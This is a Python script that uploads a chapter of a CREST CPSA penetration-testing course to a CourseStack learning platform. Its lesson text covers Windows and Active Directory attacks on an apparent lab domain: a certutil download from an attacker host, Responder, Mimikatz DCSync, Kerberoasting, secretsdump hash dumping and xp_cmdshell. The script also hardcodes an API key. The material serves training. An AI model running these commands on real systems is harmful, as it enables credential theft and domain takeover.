"""
Module E - CourseStack Push Script
Builds the full Module E chapter + 6 lessons in the CPSA course.

Run on Windows:
    python push_module_e_coursestack.py

Or pull direct from GitHub:
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/heaps1345/mca-activites/main/scripts/push_module_e_coursestack.py" -OutFile "push_module_e_coursestack.py"
    python push_module_e_coursestack.py
"""

import requests
from requests.auth import HTTPBasicAuth
import time
import uuid


def uid():
    return str(uuid.uuid4()).replace("-", "")

API_KEY   = "sk_5e9fde21e45324530a735286f8e28bcecf3e9df298ab37ec016833ed57c4f2e52b215010e457e6f3de80c070d3161ff5"
BASE      = "https://app.coursestack.com"
COURSE_ID = "b9d920c3-4a8e-4227-af24-3c5f32fc7350"
auth      = HTTPBasicAuth(API_KEY, "")
GITHUB    = "https://heaps1345.github.io/mca-activites/cpsa/module-e"

LABS = [
    {
        "name": "Module E Pre-flight: Engagement Brief and Environment Check",
        "url":  f"{GITHUB}/lab-e0-preflight-v1.html",
        "theory": """## Before You Start - Read This First

This lesson contains two required steps before you begin any Module E lab:

1. **Read and acknowledge the engagement brief** - You are acting as a CREST-authorised penetration tester on an authorised assessment of Syntex Solutions Ltd. The brief sets your scope, rules of engagement, and legal boundaries.

2. **Complete the technical pre-flight checklist** - Confirm your environment is ready: SYNTEX-DC01 is running, you can ping it, and all required tools are installed.

The interactive page below will not unlock the **Begin Lab E1-A** button until both are complete.

### The Scenario

**Client:** Syntex Solutions Ltd - a UK fintech company processing cardholder data under PCI DSS v4.0 and UK GDPR.

**Your role:** CREST-authorised penetration tester with internal network access to the Syntex Windows domain.

**Target:** SYNTEX-DC01 (Windows Server 2016, syntex.local domain controller).

**Goal:** Identify attack paths from unauthenticated network access to Domain Admin and assess cardholder data exposure.

### Rules of Engagement (Summary)
- No denial of service attacks
- Do not exfiltrate more cardholder data than needed to evidence a finding
- If you reach Domain Admin - stop and document, do not make AD changes
- Log all commands and output for the final report
- Report CVSS 9.0+ findings to the engagement lead immediately

> ★ **CREST exam point:** In a real engagement, you must have written authorisation before touching any system. The scope document and rules of engagement define what you can and cannot test. Always check scope before running any tool.
"""
    },
    {
        "name": "Lab E1-A: SMB Enumeration",
        "url":  f"{GITHUB}/lab-e1a-smb-enumeration-v1.html",
        "theory": """## SMB Enumeration

SMB (Server Message Block) is one of the most valuable attack surfaces in Windows environments. It exposes shares, user accounts, OS version, signing configuration, and often provides unauthenticated access to sensitive data.

### Key Tools
- **Nmap** - SMB version detection and signing scripts
- **enum4linux-ng** - Comprehensive null session enumeration
- **smbclient** - Interactive share browsing
- **smbmap** - Automated share permission mapping
- **CrackMapExec** - Authenticated domain enumeration

### Why SMB Signing Matters
When SMB signing is **not required**, you can relay captured NTLM hashes directly to other hosts without cracking them first. This is checked with:
```
nmap --script smb-security-mode -p 445 <target>
```

### CREST CPSA Focus
- Null sessions (anonymous access) are a HIGH finding
- Credentials found in shares are a CRITICAL finding
- SMB signing disabled = relay attack possible = escalate severity of any captured hash

> ★ **Exam point:** Know the difference between SMB signing *disabled*, *not required*, and *required* - each has different security implications.
"""
    },
    {
        "name": "Lab E2-A: Credential Access",
        "url":  f"{GITHUB}/lab-e2a-credential-access-v1.html",
        "theory": """## Credential Access - Responder and Pass-the-Hash

LLMNR and NBT-NS are legacy Windows name resolution protocols that broadcast queries to the local network when DNS fails. Responder poisons these broadcasts to capture NetNTLMv2 hashes.

### Attack Flow
1. A Windows host sends an LLMNR/NBT-NS broadcast for an unresolvable name
2. Responder answers: "That's me - authenticate to me"
3. Windows authenticates, sending a NetNTLMv2 challenge-response hash
4. Hash is saved to `/usr/share/responder/logs/`

### Hash Types - Critical Distinction
| Hash | Hashcat Mode | Can Pass? | Must Crack? |
|------|-------------|-----------|-------------|
| NetNTLMv2 | 5600 | ❌ No | ✅ Yes (or relay) |
| NT Hash | 1000 | ✅ Yes (PTH) | Optional |

### NTLM Relay Alternative
If you can't crack the hash, relay it with `ntlmrelayx.py` to another host where the victim has admin rights. Disable SMB and HTTP in `/etc/responder/Responder.conf` first.

> ★ **Exam point:** NetNTLMv2 **cannot** be passed directly. You must either crack it with Hashcat (mode 5600) or relay it with ntlmrelayx.py. NT hashes (from Mimikatz/secretsdump) **can** be passed with Evil-WinRM `-H` or CrackMapExec.
"""
    },
    {
        "name": "Lab E3-A: Windows Privilege Escalation",
        "url":  f"{GITHUB}/lab-e3a-windows-privesc-v1.html",
        "theory": """## Windows Privilege Escalation

After gaining an initial foothold as a low-privileged user, privilege escalation finds misconfigurations that allow elevation to SYSTEM or Administrator.

### WinPEAS
WinPEAS is the go-to automated enumeration tool. Transfer it with:
```
certutil -urlcache -split -f http://<KALI-IP>/winpeas.exe winpeas.exe
```

### Key Escalation Paths in Syntex Environment
| Vulnerability | Service/Location | Technique |
|--------------|-----------------|-----------|
| Unquoted Service Path | SyntexBackup | Place Syntex.exe in writable parent dir |
| AlwaysInstallElevated | Registry (both hives) | msfvenom MSI payload |
| Weak ACL Service | SyntexMonitor | Replace binary |
| Scheduled Task Script | C:\\Scripts\\maintenance.ps1 | Overwrite with reverse shell |

### After SYSTEM
Once you have SYSTEM on the DC, immediately run Mimikatz:
```
sekurlsa::logonpasswords
lsadump::dcsync /domain:syntex.local /all
```

> ★ **Exam point:** AlwaysInstallElevated requires **both** HKCU and HKLM registry keys set to 1. If only one is set, the attack doesn't work.
"""
    },
    {
        "name": "Lab E3-B: ACLs, Registry and File Permissions",
        "url":  f"{GITHUB}/lab-e3b-acl-permissions-v1.html",
        "theory": """## ACLs, Registry and File Permissions (CPSA B13)

With SYSTEM on the DC, auditing file system and registry ACLs identifies overly permissive access controls that could be exploited for persistence or lateral movement - and documents misconfigurations for the report.

### Key Tools
- **icacls** - Built-in Windows ACL viewer; outputs permission flags for files and directories
- **Get-Acl** (PowerShell) - Full ACL object including owner, DACL, and SACL
- **accesschk.exe** (Sysinternals) - Fast ACL sweep, can filter by user or group
- **reg query** - Read registry ACLs from the command line

### icacls Permission Flags
| Flag | Meaning |
|------|---------|
| F | Full control |
| M | Modify |
| RX | Read and execute |
| W | Write only |
| OI | Object inherit (applies to files in directory) |
| CI | Container inherit (applies to subdirectories) |

### High-Value Targets to Check
- Service binary directories (especially unquoted paths from PrivEsc)
- HKLM\\SYSTEM\\CurrentControlSet\\Services (service ImagePath keys)
- C:\\Windows\\Temp and C:\\Temp (writable by low-priv users)
- PATH directories - writable PATH = DLL/binary hijack

> ★ **Exam point (CPSA B13):** Misconfigured ACLs on service directories, registry keys, and PATH entries are the three primary ACL-based attack paths. Know how to enumerate all three and the `icacls` flags that indicate write access (W, M, F).
"""
    },
    {
        "name": "Lab E4-A: Active Directory Enumeration",
        "url":  f"{GITHUB}/lab-e4a-ad-enumeration-v1.html",
        "theory": r"""## Active Directory Enumeration

With a valid domain credential, you can query the entire AD structure via LDAP. The goal is to map the attack path to Domain Admin.

### LDAP Enumeration
```bash
# All users with descriptions (often contain passwords)
ldapsearch -x -H ldap://<DC-IP> -D "svc-backup@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName description
```

### BloodHound
BloodHound visualises AD attack paths using graph theory. It shows:
- **Shortest Path to Domain Admins** - always run this first
- **HasSession edges** - where DA accounts are logged in (dump creds there)
- **Kerberoastable accounts** - accounts with SPNs
- **DCSync rights** - accounts that can dump all hashes

### Collection Methods
**From Kali (preferred - no AV risk):**
```bash
bloodhound-python -u svc-backup -p Password1 -d syntex.local -ns <DC-IP> -c All
```

**From target (if needed):**
```powershell
.\SharpHound.exe -c All
```

> ★ **Exam point:** "Shortest Paths to Domain Admins" is always the first BloodHound query. HasSession edges are the most operationally valuable - they show where to find DA credentials already in memory.
"""
    },
    {
        "name": "Lab E4-B: Password Policy and Password Spraying",
        "url":  f"{GITHUB}/lab-e4b-password-policy-spray-v1.html",
        "theory": """## Password Policy Assessment and Safe Spraying (CPSA E4)

With a valid username list from AD enumeration, you can assess the domain password policy and execute a controlled password spray. The key constraint: spray safely to avoid account lockout.

### Extract the Password Policy
```bash
# From Kali with one valid credential
crackmapexec smb <DC-IP> -u svc-backup -p Password1 --pass-pol
```

### Key Policy Values to Document
| Setting | Weak Threshold | Finding |
|---------|---------------|---------|
| Min password length | < 12 characters | MEDIUM |
| Lockout threshold | > 5 attempts | HIGH |
| Lockout observation window | < 30 minutes | HIGH |
| Max password age | > 90 days | MEDIUM |

### Safe Spray Formula
Safe attempts per window = Lockout threshold - 1

If lockout threshold = 5 and window = 30 minutes:
- You can try 4 passwords per 30 minutes without triggering lockout
- Always use --no-bruteforce with CME to send exactly one password per account

### Fine-Grained Password Policies (FGPP)
Check for FGPP - different user groups may have stricter or weaker policies than the default domain policy. FGPPs are stored in the Password Settings Container in AD.

> ★ **Exam point (CPSA E4):** You MUST document the domain password policy before spraying. Spraying without checking the lockout threshold and observation window is a serious operational error that can lock out production accounts. The safe spray limit is always threshold minus 1.
"""
    },
    {
        "name": "Lab E5-A: Kerberos Attacks",
        "url":  f"{GITHUB}/lab-e5a-kerberos-attacks-v1.html",
        "theory": """## Kerberos Attacks - Kerberoasting and AS-REP Roasting

Two distinct attacks exploit Kerberos to obtain offline-crackable hashes.

### Comparison

| Property | Kerberoasting | AS-REP Roasting |
|----------|--------------|-----------------|
| Credentials required? | Yes (any domain user) | No |
| AD condition | Account has SPN set | Pre-authentication disabled |
| Hashcat mode | 13100 | 18200 |
| Tool | GetUserSPNs.py | GetNPUsers.py |

### Kerberoasting
```bash
GetUserSPNs.py syntex.local/svc-backup:Password1 -dc-ip <DC-IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting (no credentials needed)
```bash
GetNPUsers.py syntex.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> ★ **Exam point:** AS-REP Roasting needs NO credentials - try it first when you have zero domain access. Hashcat mode 13100 = Kerberoasting, 18200 = AS-REP Roasting. Memorise both.
"""
    },
    {
        "name": "Lab E5-B: SAM Dump and Cached Domain Credentials",
        "url":  f"{GITHUB}/lab-e5b-sam-dump-v1.html",
        "theory": """## SAM Dump and Cached Domain Credentials (CPSA E5)

With SYSTEM or Domain Admin access, extract every password hash stored on the DC. SAM holds local account NT hashes. The registry SECURITY hive holds up to 10 cached domain logon hashes (DCC2).

### Hash Types - Know Which Can Be Passed

| Hash | Hashcat Mode | Can Pass? | Tool |
|------|-------------|-----------|------|
| NT (NTLM) | 1000 | YES - PTH | Evil-WinRM -H, CME -H |
| DCC2 | 2100 | NO - crack only | secretsdump offline |
| NetNTLMv2 | 5600 | NO - crack/relay | Responder + Hashcat |
| Kerberos TGS | 13100 | NO - crack only | GetUserSPNs.py |

### Remote Dump (Preferred - No Files on Target)
```bash
secretsdump.py syntex.local/da-account:Password@<DC-IP>
```

### Manual Hive Extraction (When No Remote Access)
```powershell
# On target with SYSTEM shell
reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive
reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive
```
Then transfer to Kali and process: `secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL`

Always delete hive files from the target after transfer.

> ★ **Exam point (CPSA E5):** DCC2 hashes CANNOT be passed over the network. They are stored so Windows can authenticate domain users when the DC is unreachable (offline logon). Hashcat mode 2100 cracks them - but it is slow due to 10,240 PBKDF2 iterations. Use NT hashes for Pass-the-Hash where possible to save time.
"""
    },
    {
        "name": "Lab E6-A: SQL Server Exploitation",
        "url":  f"{GITHUB}/lab-e6a-sql-exploitation-v1.html",
        "theory": r"""## SQL Server Exploitation - xp_cmdshell and Data Extraction

SQL Server with a weak sa password provides direct OS command execution via xp_cmdshell.

### Discovery
```bash
nmap -p 1433 -sV --script ms-sql-info,ms-sql-config <target>
crackmapexec mssql <target> -u sa -p Syntex2024!
```

### Connect and Enable xp_cmdshell
```bash
mssqlclient.py sa:Syntex2024! @<DC-IP>
```
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### SeImpersonatePrivilege
The SQL Server service account has SeImpersonatePrivilege. This allows escalation to SYSTEM via PrintSpoofer or GodPotato - then dump all AD hashes with secretsdump.py.

### PCI DSS Findings
- CustomerCards table contains PAN, CVV, expiry in plaintext - PCI DSS v4.0 Req 3.3 violation
- CVV must **never** be stored post-authorisation
- InternalCredentials table exposes domain admin password

> ★ **Exam point:** SQL Server = port 1433. xp_cmdshell requires sysadmin role. SeImpersonatePrivilege on a service account = SYSTEM via Potato exploit. Always mask PAN to first 6 + last 4 digits in reports.
"""
    },
    {
        "name": "Lab E7-A: Patch Level Assessment and WSUS Review",
        "url":  f"{GITHUB}/lab-e7a-patch-assessment-v1.html",
        "theory": """## Patch Level Assessment and WSUS Configuration (CPSA E5, E6)

The final assessment task: document the patch posture of the Windows environment. An unpatched DC is a standalone HIGH/CRITICAL finding, especially when missing patches map to publicly known exploits.

### Three Enumeration Methods

```powershell
# 1. systeminfo - quick list, build number, last hotfix
systeminfo | findstr /i "hotfix\\|os version\\|build"

# 2. wmic qfe - full details with install dates (CSV export)
wmic qfe get HotFixID,InstalledOn,Description /format:csv > patches.csv

# 3. Get-HotFix - PowerShell, sortable by date
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5
```

### WSUS Registry Audit
```
HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate
  WUServer        - WSUS server URL (check for http:// vs https://)
  NoAutoUpdate    - 1 = automatic updates DISABLED (bad)
  AUOptions       - 2 = notify only (no auto-install)
```

### WSUS HTTP vs HTTPS
- HTTP (port 8530): update stream can be intercepted - HIGH finding
- HTTPS (port 8531): encrypted update channel - correct configuration

### Automated CVE Mapping
Watson.exe maps your current build number to unpatched CVEs automatically. Always use it to provide evidence-backed CVE claims in the report.

> ★ **Exam point (CPSA E5/E6):** Know all three patch enumeration methods. In the report, always include: last patch date, current build number, specific CVEs with CVSS scores, and the business impact of each. Never claim a CVE without verifying the fixing KB is absent. WSUS over HTTP is a reportable finding in its own right.
"""
    },
]


def post(endpoint, payload):
    r = requests.post(f"{BASE}{endpoint}", auth=auth, json=payload, timeout=15)
    if r.status_code not in (200, 201):
        print(f"  ERROR {r.status_code}: {r.text[:300]}")
        return None
    try:
        return r.json()
    except Exception:
        return {"ok": True}


def create_lesson_with_content(chapter_id, name, theory_md, lab_url):
    # Step 1 - create lesson shell (no client-generated IDs)
    print(f"  Creating lesson shell: {name}")
    result = post(f"/api/content/{COURSE_ID}/lessons", {
        "chapter_id": chapter_id,
        "name": name,
        "type": "lesson"
    })
    if not result:
        return None

    # Extract lesson ID from whatever shape the response comes back as
    real_id = (
        result.get("id")
        or result.get("lesson_id")
        or (result.get("lesson") or {}).get("id")
        or (result.get("data") or {}).get("id")
    )
    if not real_id:
        print(f"  WARNING: could not extract lesson ID from response: {result}")
        return None

    time.sleep(0.5)

    # Step 2 - push content (API requires id on content block and each item)
    print(f"  Pushing content to lesson: {real_id}")
    result2 = post(f"/api/content/{COURSE_ID}/lessons/{real_id}", {
        "content": {
            "id": uid(),
            "type": "lesson",
            "items": [
                {
                    "id": uid(),
                    "type": "text",
                    "markdown": theory_md
                },
                {
                    "id": uid(),
                    "type": "iframe",
                    "url": lab_url,
                    "aspect_height": 9,
                    "aspect_width": 16
                }
            ]
        }
    })
    if result2:
        print(f"  ✓ Done: {name}")
    return real_id


def main():
    print("=== Module E - CourseStack Push ===")
    print(f"Course: {COURSE_ID}")
    print()

    # Create the Module E chapter
    print("Creating chapter: Module E - Windows Security Assessment")
    ch = post(f"/api/content/{COURSE_ID}/chapters", {
        "name": "Module E - Windows Security Assessment",
        "type": "chapter"
    })
    if not ch:
        print("FAILED to create chapter - check API key / course ID")
        return

    chapter_id = (
        ch.get("id")
        or ch.get("chapter_id")
        or (ch.get("chapter") or {}).get("id")
        or (ch.get("data") or {}).get("id")
    )
    if not chapter_id:
        print(f"FAILED to extract chapter ID from response: {ch}")
        return
    print(f"  Chapter ID: {chapter_id}")
    print()

    # Create each lesson
    for lab in LABS:
        create_lesson_with_content(
            chapter_id=chapter_id,
            name=lab["name"],
            theory_md=lab["theory"],
            lab_url=lab["url"]
        )
        time.sleep(1)

    print()
    print("=== Complete ===")
    print("Module E is now in CourseStack.")
    print(f"Check: https://app.coursestack.com (course: CREST CPSA)")


if __name__ == "__main__":
    main()
